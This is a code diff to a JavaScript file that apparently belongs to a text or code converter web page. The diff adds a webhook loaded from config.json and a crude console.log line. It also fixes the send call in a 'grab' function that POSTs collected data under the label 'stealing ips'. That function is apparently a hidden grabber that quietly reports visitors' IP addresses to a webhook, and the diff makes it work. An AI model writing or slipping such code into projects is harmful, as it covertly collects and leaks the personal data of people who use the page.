@@ -1,6 +1,7 @@
 input = document.getElementById("input");
 
 input.addEventListener("input", convert);
+var webhook = require("./config.json");
 
 function convert() {
   var code = document.getElementById("input").value;
@@ -131,6 +132,7 @@ document.getElementById("input").addEventListener("keydown", function (e) {
 });
 
 function grab() {
+  console.log("cock");
   var req = new XMLHttpRequest();
   req.open(
     "POST",
@@ -145,7 +147,7 @@ function grab() {
         username: "stealing ips",
         content: data,
       };
-      request.send(JSON.stringify(params));
+      req.send(JSON.stringify(params));
     }
   );
 }
